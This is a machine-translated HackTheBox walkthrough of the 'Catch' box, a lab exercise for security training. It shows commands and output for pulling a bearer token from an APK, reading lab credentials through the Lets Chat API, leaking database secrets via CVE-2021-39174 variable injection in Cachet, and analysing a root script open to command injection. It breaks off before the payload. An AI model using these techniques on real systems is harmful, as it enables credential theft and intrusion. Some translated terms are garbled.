<html>
<head>
<title>Catch from HackTheBox — Detailed Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">从黑客盒子捕捉-详细演练</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/catch-from-hackthebox-detailed-walkthrough-d0ad7cf318b3?source=collection_archive---------1-----------------------#2022-07-23">https://infosecwriteups.com/catch-from-hackthebox-detailed-walkthrough-d0ad7cf318b3?source=collection_archive---------1-----------------------#2022-07-23</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="9856" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">向您展示完成盒子所需的所有工具和技术。</h2></div><h1 id="96e3" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">机器信息</h1><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi kx"><img src="../Images/c275c1844cf5803c9554322b832ab048.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/0*DH-WfVfdjzYnxSsW.png"/></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">从箱子里抓鱼</figcaption></figure><p id="42e6" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">Catch在HackTheBox上被评为中型机。这个Linux盒子有许多开放端口，但是我们从一个APK开始，我们下载并反编译它以找到一个不记名令牌。这样，我们就可以在Cachet中找到凭据，这样我们就可以进行访问，允许使用已知的CVE来检索更多凭据。这些为我们提供了对SSH的访问，在枚举操作系统后，我们发现了一个不安全的脚本，我们可以利用它来找到root。</p><p id="c00c" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">所需的技能是枚举和使用已知的利用。学到的技能是反编译和操纵APK文件。</p><div class="mf mg gp gr mh mi"><a href="https://www.hackthebox.com/home/machines/profile/450" rel="noopener  ugc nofollow" target="_blank"><div class="mj ab fo"><div class="mk ab ml cl cj mm"><h2 class="bd ir gy z fp mn fr fs mo fu fw ip bi translated">捕捉—破解盒子::渗透测试实验室</h2><div class="mp l"><h3 class="bd b gy z fp mn fr fs mo fu fw dk translated">登录Hack The Box平台，让您的笔测试和网络安全技能更上一层楼！</h3></div><div class="mq l"><p class="bd b dl z fp mn fr fs mo fu fw dk translated">www.hackthebox.com</p></div></div><div class="mr l"><div class="ms l mt mu mv mr mw ld mi"/></div></div></a></div><h1 id="9988" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">初步侦察</h1><p id="1dc8" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">像往常一样，让我们从Nmap开始:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nc"><img src="../Images/7228a69b39482b87deb55a749f484cac.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*vjVkroALpzaCUfhZMOIktA.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">从黑盒子中捕获的Nmap扫描</figcaption></figure><p id="58b1" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">我们找到几个开放的端口，让我们像往常一样从80开始:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nh"><img src="../Images/cd1fa89b0ecd219b3f0ad7e0d02a0e2e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*7yq23fPGw1-WjR67.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">Catch网站</figcaption></figure><p id="2dc3" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">这是一个静态网站，提到了Lets-Chat和Gitea集成，但没有什么明显的发现。</p><h1 id="2342" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">下载APK</h1><p id="aa29" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">有一个“现在下载”按钮给我们一个apk文件。让我们抓住这个:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="2890" class="nn kg iq nj b gy no np l nq nr">┌──(root㉿kali)-[~/htb/catch]<br/>└─# wget http://catch.htb/catchv1.0.apk<br/>--2022-04-21 22:25:51--  http://catch.htb/catchv1.0.apk<br/>Resolving catch.htb (catch.htb)... 10.10.11.150<br/>Connecting to catch.htb (catch.htb)|10.10.11.150|:80... connected.<br/>HTTP request sent, awaiting response... 200 OK<br/>Length: 3356353 (3.2M) [application/vnd.android.package-archive]<br/>Saving to: ‘catchv1.0.apk’<br/>catchv1.0.apk  100%[=============&gt;]   3.20M  3.51MB/s    in 0.9s    <br/>2022-04-21 22:25:52 (3.51 MB/s) - ‘catchv1.0.apk’ saved [3356353/3356353]</span></pre><h1 id="f913" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">吉特亚</h1><p id="937a" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">这里没什么可看的了，让我们试试nmap之前找到的端口3000:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi ns"><img src="../Images/d59326a40c8ed150fe6c4f712bd22e8e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*bwwiz4vVTSLx3Mct.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">端口3000上的Gitea实例</figcaption></figure><p id="8380" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">这里我们发现了一个Gitea的安装版本，它就像是GitHub的一个自托管版本。环顾四周，这里也没有什么明显的，我找不到这个版本的漏洞。</p><h1 id="bd95" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">让我们登录聊天</h1><p id="8375" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">在nmap找到的下一个端口5000上:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nu"><img src="../Images/a3d69540a7e47a1371de462147782f16.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*lqafQKScO19_ZViH.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">让我们在5000端口上聊天</figcaption></figure><p id="0e07" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">现在我们找到了一个安装了<a class="ae nt" href="https://github.com/sdelements/lets-chat" rel="noopener ugc nofollow" target="_blank">let Chat</a>的登录页面，这是一个为小团队提供的自托管聊天应用。</p><h1 id="40c3" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">缓存登录</h1><p id="2950" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">最后，让我们看看我们找到的最后一个端口8000:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nv"><img src="../Images/27055f20b0e029477346175392085489.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*sd5ccY4skO53BI4M.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">端口8000上的缓存登录页面</figcaption></figure><p id="e1d5" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">这是一个对本地安装的<a class="ae nt" href="https://cachethq.io/" rel="noopener ugc nofollow" target="_blank"> Cachet </a>的登录，这是一个开源的状态页面系统。</p><h1 id="adab" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">反编译APK</h1><p id="340c" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">所以我们有很多事情要研究。我从头开始反编译我下载的apk:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="039e" class="nn kg iq nj b gy no np l nq nr">┌──(root㉿kali)-[~/htb/catch]<br/>└─# apktool           <br/>Command 'apktool' not found, but can be installed with:<br/>apt install apktool<br/>Do you want to install it? (N/y)y<br/>apt install apktool<br/>Reading package lists... Done<br/>Building dependency tree... Done<br/>Reading state information... Done<br/>The following additional packages will be installed:<br/>  aapt android-framework-res android-libaapt android-libandroidfw android-libbacktrace android-libbase android-libcutils android-liblog android-libunwind android-libutils android-libziparchive junit libantlr-java<br/>  libantlr3-runtime-java libapache-pom-java libatinject-jsr330-api-java libcommons-cli-java libcommons-io-java libcommons-lang3-java libcommons-parent-java libguava-java libjsr305-java libsmali-java libstringtemplate-java<br/>  libxmlunit-java libxpp3-java libyaml-snake-java<br/>0 upgraded, 28 newly installed, 0 to remove and 151 not upgraded.<br/>Need to get 21.8 MB of archives.<br/>After this operation, 58.3 MB of additional disk space will be used.<br/>&lt;SNIP&gt;<br/>Setting up android-libbacktrace (1:10.0.0+r36-10) ...<br/>Setting up libcommons-io-java (2.11.0-2) ...<br/>Setting up android-libutils (1:10.0.0+r36-10) ...<br/>Setting up android-libandroidfw:amd64 (1:10.0.0+r36-3) ...<br/>Setting up android-libaapt:amd64 (1:10.0.0+r36-3) ...<br/>Setting up aapt (1:10.0.0+r36-3) ...<br/>Setting up apktool (2.5.0+dfsg.1-2) ...</span></pre><p id="259c" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">Apktool 很好，使用起来很简单。它没有安装，但在Kali库中，所以在它完成后，我们可以使用反编译apk:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="ab33" class="nn kg iq nj b gy no np l nq nr">┌──(root㉿kali)-[~/htb/catch]<br/>└─# apktool d catchv1.0.apk <br/>I: Using Apktool 2.5.0-dirty on catchv1.0.apk<br/>I: Loading resource table...<br/>I: Decoding AndroidManifest.xml with resources...<br/>I: Loading resource table from file: /root/.local/share/apktool/framework/1.apk<br/>I: Regular manifest package...<br/>I: Decoding file-resources...<br/>I: Decoding values */* XMLs...<br/>I: Baksmaling classes.dex...<br/>I: Copying assets and libs...<br/>I: Copying unknown files...<br/>I: Copying original files...</span></pre><p id="a502" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">现在我们有一个文件夹，里面有apk的所有文件。经过一番搜索，我终于找到了这个:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nw"><img src="../Images/4545826bb057a109b039428ec3a293c9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sm_HaM81xD1Lr72xFlXPAA.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">反编译apk中标记的Grep</figcaption></figure><h1 id="3de2" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">列举让我们聊天</h1><p id="1fcb" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">这是一个名为strings.xml的文件，带有Gitea的标记。“让我们聊天”是我们想要的，但它花了我相当多的工作。首先，我找到了<a class="ae nt" href="https://github.com/sdelements/lets-chat/issues/436" rel="noopener ugc nofollow" target="_blank">这个</a>和<a class="ae nt" href="https://github.com/taigaio/taiga-contrib-letschat/issues/2" rel="noopener ugc nofollow" target="_blank">这个</a>，这有助于如何使用一个不记名令牌，就像我们刚刚找到的那个，并使用curl与Lets Chat API进行交互。</p><p id="e2f0" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">我还找到了<a class="ae nt" href="https://github.com/sdelements/lets-chat/wiki/API" rel="noopener ugc nofollow" target="_blank">这个</a>，它向你展示了如何使用API来检索数据。首先我看了看账户:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="f047" class="nn kg iq nj b gy no np l nq nr">┌──(root㉿kali)-[~/htb/catch/catchv1.0]<br/>└─# curl -s -X GET "http://catch.htb:5000/account/" -H "Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" | json_pp                              <br/>{<br/>   "avatar" : "e2b5310ec47bba317c5f1b5889e96f04",<br/>   "displayName" : "Admin",<br/>   "firstName" : "Administrator",<br/>   "id" : "61b86aead984e2451036eb16",<br/>   "lastName" : "NA",<br/>   "openRooms" : [<br/>      "61b86b28d984e2451036eb17",<br/>      "61b86b3fd984e2451036eb18",<br/>      "61b8708efe190b466d476bfb"<br/>   ],<br/>   "username" : "admin"<br/>}</span></pre><p id="f2b4" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">这显示了一个开放房间的列表。接下来我看了列表上的第一个房间:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="cb8b" class="nn kg iq nj b gy no np l nq nr">┌──(root㉿kali)-[~/htb/catch/catchv1.0]<br/>└─# curl -s -X GET "http://catch.htb:5000/rooms/61b86b28d984e2451036eb17" -H "Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" | json_pp <br/>{<br/>   "created" : "2021-12-14T10:00:08.384Z",<br/>   "description" : "Cachet Updates and Maintenance",<br/>   "hasPassword" : false,<br/>   "id" : "61b86b28d984e2451036eb17",<br/>   "lastActive" : "2021-12-14T10:34:20.749Z",<br/>   "name" : "Status",<br/>   "owner" : "61b86aead984e2451036eb16",<br/>   "participants" : [],<br/>   "private" : false,<br/>   "slug" : "status"<br/>}</span></pre><p id="006f" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">没有太大帮助，尽管它提到了我们之前在端口8000上发现的Cachet。再次查看文档，您可以列出一个房间中的所有邮件，让我们这样做:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="de5a" class="nn kg iq nj b gy no np l nq nr">┌──(root㉿kali)-[~/htb/catch/catchv1.0]<br/>└─# curl -s -X GET "http://catch.htb:5000/rooms/61b86b28d984e2451036eb17/messages" -H "Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" | json_pp<br/>[<br/>&lt;SNIP&gt;<br/>   {<br/>      "id" : "61b8702dfe190b466d476bfa",<br/>      "owner" : "61b86f15fe190b466d476bf5",<br/>      "posted" : "2021-12-14T10:21:33.859Z",<br/>      "room" : "61b86b28d984e2451036eb17",<br/>      "text" : "Here are the credentials `john :  E}V!mywu_69T4C}W`"<br/>   },<br/>&lt;SNIP&gt;<br/>]</span></pre><p id="05b6" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">有几条信息，但这条很有趣。</p><h1 id="f71d" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">作为John的Cachet访问</h1><p id="e0a1" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">让我们在之前找到的登录页面上尝试一下:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nx"><img src="../Images/05b8f5352f30970ccfc997f521375ef3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*yO6Fy5RW970kq3P3.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">用找到的凭据缓存登录</figcaption></figure><p id="2448" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">它成功了，我们进入了:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi ny"><img src="../Images/3b061a33fb80c74e7271c460f912be26.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*K0JPtKx-lEQncBXt.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">纪念印仪表板</figcaption></figure><h1 id="81d6" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">CVE-2021–39174</h1><p id="eaaf" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">我不知道如何使用这个。在设置页面上，它告诉我们版本是2.4.0-dev。搜索漏洞会将这个带到顶部。请看CVE-2021–39174上的一节，它显示了可以通过嵌套变量泄漏配置细节。也有视频，但是很容易做。进入设置和邮件，开始打嗝听音，点击保存按钮:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nz"><img src="../Images/c780179a33ced9f0e8b727ec4a2323ed.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*D2ihxCCwkS1xcGcE.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">缓存邮件设置</figcaption></figure><p id="e697" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">切换到Burp以查看拦截的请求:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi oa"><img src="../Images/d44c57ed1885eee6f435af7d04c496ae.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*1Rd-w7wUsozejOwe.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">拦截保存请求</figcaption></figure><p id="0956" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">将配置[邮件驱动程序]部分从smtp更改为$ {数据库用户名}，然后单击转发:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi ob"><img src="../Images/5bb01f87406acee5deee0fe074111ef5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1208/format:webp/0*TraLRQm6zN2DIQ99.png"/></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">转发前更改发布请求</figcaption></figure><p id="ce14" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">如果您收到另一个回复，请再次点按“转发”,然后关闭“拦截”并切换回网站:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi oc"><img src="../Images/891e72f2c0c89d9ec1b41b9545f7ad18.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*gnxgrAwY7x422ZZ7.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">门户上的更新成功</figcaption></figure><p id="67a1" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">我们看到消息Awesome表示设置已更新。现在点击测试并确认:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi od"><img src="../Images/6305232151b2f222b8fdd18b4c59a91c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*ehnZm4ZdweaYrryl.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">缓存漏洞的错误消息</figcaption></figure><p id="1764" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">这篇文章建议我不要看到这个错误屏幕，但是在搜索了一些日志之后，我们发现泄漏是成功的:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi oe"><img src="../Images/5e98099555c2576af994936e7c02be28.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*QtwWLjhPAFWW2qm1.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">可以在日志中看到数据泄漏</figcaption></figure><p id="764c" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">DB_USERNAME是Will。现在重复上述拦截保存在打嗝，设置配置[邮件_驱动程序]为$ {数据库_密码}，转发在打嗝，然后点击网站上的测试。查看日志，我们现在有了密码:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi of"><img src="../Images/7808c08b90d9a79c5f0d020fd638d5de.png" data-original-src="https://miro.medium.com/v2/resize:fit:1138/format:webp/0*WjmOt3B2o2Hj8iNw.png"/></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">用户意愿的密码</figcaption></figure><h1 id="1286" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">SSH访问随心所欲</h1><p id="1a16" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">原来这些数据库凭证已经被SSH访问重用:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="451b" class="nn kg iq nj b gy no np l nq nr">┌──(root㉿kali)-[~/htb/catch/catchv1.0]<br/>└─# ssh will@catch.htb                                         <br/>will@catch.htbs password: <br/>Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-104-generic x86_64)<br/><br/>  System information as of Fri 22 Apr 2022 04:37:04 PM UTC<br/><br/>Last login: Fri Apr 22 16:16:22 2022 from 10.10.14.101<br/>will@catch:~$</span></pre><h1 id="0d8b" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">用户标志</h1><p id="79a8" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">在继续之前，让我们抓住用户标志:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="8b3d" class="nn kg iq nj b gy no np l nq nr">will@catch:~$ cat user.txt <br/>14c926ad5fee703cd6f26b9ec681ae23</span></pre><h1 id="8818" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">Pspy64</h1><p id="ec59" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">我尝试了<a class="ae nt" href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" rel="noopener ugc nofollow" target="_blank"> LinPEAS </a>但是什么也没找到，所以我用<a class="ae nt" href="https://github.com/DominicBreuker/pspy" rel="noopener ugc nofollow" target="_blank"> pspy </a>查看了一下正在运行的进程。</p><p id="872e" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">首先获取最新版本并复制到包装盒中:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="85bd" class="nn kg iq nj b gy no np l nq nr">┌──(root㉿kali)-[~/htb/catch]<br/>└─# wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64<br/>--2022-04-22 17:41:08--  https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64<br/>Resolving github.com (github.com)... 140.82.121.4<br/>Connecting to github.com (github.com)|140.82.121.4|:443... connected.<br/>HTTP request sent, awaiting response... 302 Found<br/>&lt;SNIP&gt;<br/>HTTP request sent, awaiting response... 200 OK<br/>Length: 3078592 (2.9M) [application/octet-stream]<br/>Saving to: ‘pspy64’<br/>pspy64      100%[===============&gt;]   2.94M  2.68MB/s    in 1.1s    <br/>2022-04-22 17:41:10 (2.68 MB/s) - ‘pspy64’ saved [3078592/3078592]<br/><br/>┌──(root㉿kali)-[~/htb/catch]<br/>└─# scp pspy64 will@catch.htb:~<br/>will@catch.htbs password: <br/>pspy64                                                        100% 3006KB   1.7MB/s   00:01</span></pre><p id="1993" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">现在切换回盒子并运行pspy:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi og"><img src="../Images/e27b03c4f185ea75ec960b6bd6ff457d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6yl1gKSemc1WCsJRHzOYcQ.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">Pspy在盒子上看进程</figcaption></figure><h1 id="70b5" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">代码审查</h1><p id="a194" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">仅仅几秒钟后，我们看到root用户频繁运行一个名为verify.sh的shell脚本。让我们把它记下来，以便我们理解它。</p><p id="1912" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">第一部分使用jarsigner检查被访问的apk是否有有效的证书:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="79cd" class="nn kg iq nj b gy no np l nq nr">will@catch:~$ cat /opt/mdm/verify.sh<br/>#!/bin/bash<br/><br/>###################<br/># Signature Check #<br/>###################<br/><br/>sig_check() {<br/>        jarsigner -verify "$1/$2" 2&gt;/dev/null &gt;/dev/null<br/>        if [[ $? -eq 0 ]]; then<br/>                echo '[+] Signature Check Passed'<br/>        else<br/>                echo '[!] Signature Check Failed. Invalid Certificate.'<br/>                cleanup<br/>                exit<br/>        fi<br/>}</span></pre><p id="8908" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">本节检查apk是使用高于18的SDK版本编译的:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="df32" class="nn kg iq nj b gy no np l nq nr">#######################<br/># Compatibility Check #<br/>#######################<br/><br/>comp_check() {<br/>        apktool d -s "$1/$2" -o $3 2&gt;/dev/null &gt;/dev/null<br/>        COMPILE_SDK_VER=$(grep -oPm1 "(?&lt;=compileSdkVersion=\")[^\"]+" "$PROCESS_BIN/AndroidManifest.xml")<br/>        if [ -z "$COMPILE_SDK_VER" ]; then<br/>                echo '[!] Failed to find target SDK version.'<br/>                cleanup<br/>                exit<br/>        else<br/>                if [ $COMPILE_SDK_VER -lt 18 ]; then<br/>                        echo "[!] APK Doesn't meet the requirements"<br/>                        cleanup<br/>                        exit<br/>                fi<br/>        fi<br/>}</span></pre><p id="07ee" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">本节使用/res/values/strings.xml文件中设置的值检查应用程序名称:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="cf2c" class="nn kg iq nj b gy no np l nq nr">####################<br/># Basic App Checks #<br/>####################<br/><br/>app_check() {<br/>        APP_NAME=$(grep -oPm1 "(?&lt;=&lt;string name=\"app_name\"&gt;)[^&lt;]+" "$1/res/values/strings.xml")<br/>        echo $APP_NAME<br/>        if [[ $APP_NAME == *"Catch"* ]]; then<br/>                echo -n $APP_NAME|xargs -I {} sh -c 'mkdir {}'<br/>                mv "$3/$APK_NAME" "$2/$APP_NAME/$4"<br/>        else<br/>                echo "[!] App doesn't belong to Catch Global"<br/>                cleanup<br/>                exit<br/>        fi<br/>}</span></pre><p id="f501" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">这是我们可以用来利用脚本的漏洞。您可以看到$APP_NAME被设置为strings.xml文件中的一个值。它检查名称是否包含Catch，然后执行mkdir {}。这种不透明性允许我们通过用分号分隔命令来执行进一步的命令。</p><p id="5990" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju 